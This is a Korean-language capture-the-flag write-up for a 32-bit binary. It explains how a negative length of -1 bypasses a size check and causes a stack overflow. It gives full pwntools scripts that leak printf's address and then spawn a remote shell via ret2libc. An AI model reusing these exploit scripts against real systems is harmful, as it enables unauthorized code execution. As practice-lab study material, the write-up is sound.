# Pwning

```c
kimdong@ubuntu  ~/Wargame/300~350  file pwning
pwning: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=4b6d53bc9aca0e73953173f153dc75bd540d6a48, not stripped

kimdong@ubuntu  ~/Wargame/300~350  checksec pwning
[*] '/home/kimdong/Wargame/300~350/pwning'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리파일은 32-bit로 NX-bit가 설정되어있다.<br>

```c
[1]kimdong@ubuntu  ~/Wargame/300~350  ./pwning
How many bytes do you want me to read? 1234
No! That size (1234) is too large!

[2] kimdong@ubuntu  ~/Wargame/300~350  ./pwning
How many bytes do you want me to read? 12
Ok, sounds good. Give me 12 bytes of data!
aaaaaaaaaaaa
You said: aaaaaaaaaaaa
```
실행시켜보면, 문자열이 출력되고 사용자의 입력값을 받는다.<br>

길이가 매우크면 [1]과 같이 문자열이 출력되고, 적당한 길이를 넣으면 [2]와 같이 사용자의 입력값을<br>
다시 받는다.<br>

```c
int vuln()
{
  char nptr; // [esp+1Ch] [ebp-2Ch]
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  get_n(&nptr, 4);
  v2 = atoi(&nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  get_n(&nptr, v2);
  return printf("You said: %s\n", &nptr);
}
```
ida로 보면 사용자의 입력값이 32byte보다 큰지 검증한다.<br>

여기서 `get_n`이라는 함수를 사용한다.<br>

```c
int __cdecl get_n(int a1, unsigned int a2)
{
  int v2; // eax
  int result; // eax
  char v4; // [esp+Bh] [ebp-Dh]
  unsigned int v5; // [esp+Ch] [ebp-Ch]

  v5 = 0;
  while ( 1 )
  {
    v4 = getchar();
    if ( !v4 || v4 == 10 || v5 >= a2 )
      break;
    v2 = v5++;
    *(v2 + a1) = v4;
  }
  result = a1 + v5;
  *(a1 + v5) = 0;
  return result;
}
```

a1에 v5를 더하는 식으로 계산을 하는데, v5가 `unsigned int`이므로, -1을 넣어주었을때, 언더플로우가 일어나 최대값을 갖게된다.<br>

이 방법을 통해 `BOF`취약점을 이용해 ret의 주소를 `/bin/sh`로 바꾸면 될것 같다.<br>


## printf_addr Leak Code

```c

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3019)
context.log_level = "debug"
e = ELF("pwning")
printf_plt = e.plt["printf"]
printf_got = e.got["printf"]
vuln_addr = 0x0804852f

payload1 = "-1"
p.recvuntil("How many bytes do you want me to read? ")
p.sendline(payload1)
p.recvuntil("\n")

payload2 = "A"*48
payload2 += p32(printf_plt)
payload2 += p32(vuln_addr)
payload2 += p32(printf_got)
p.sendline(payload2)
p.recvuntil("\n")
d=p.recv()
print_addr = u32(d[:4])
print(hex(print_addr))

p.interactive()
```
printf_addr은 `0xf7e0f020`의 주소지로 나왔다.<br>

따라서 system함수의 offset은 `0x03a940`이고, bin_sh의 offset은 `0x15902b`이다 .<br>

offset을 구한 방법은 `libc_database`를 이용하였는데, printf_addr의 뒤의 3byte를 입력하면 해당하는 libc정보들이 나오는데, 여러가지가 나올시 한개의 함수를 하나 더 Leak을 해서 알맞은 libc를 고르면 된다.<br>


이제 익스코드를 작성해보자.<br>

---

## Exploit Code

```c
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3019)
context.log_level = "debug"
e = ELF("pwning")
printf_plt = e.plt["printf"]
printf_got = e.got["printf"]
vuln_addr = 0x0804852f
printf_offset = 0x49020
system_offset = 0x03a940
bin_sh_offset = 0x15902b

payload1 = "-1"
p.recvuntil("How many bytes do you want me to read? ")
p.sendline(payload1)
p.recvuntil("\n")

payload2 = "A"*48
payload2 += p32(printf_plt)
payload2 += p32(vuln_addr)
payload2 += p32(printf_got)
p.sendline(payload2)
p.recvuntil("\n")
d=p.recv()
print_addr = u32(d[:4])
print(hex(print_addr))

libc_base = print_addr - printf_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + bin_sh_offset

p.sendline(payload1)
p.recvuntil("Ok, sounds good. Give me 4294967295 bytes of data!\n")
payload3 = "A"*48
payload3 += p32(system_addr)
payload3 += "a"*4
payload3 += p32(binsh_addr)
p.sendline(payload3)
p.interactive()

```

```c

$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xa bytes:
    'flag\n'
    'main\n'
flag
main

```

## END !
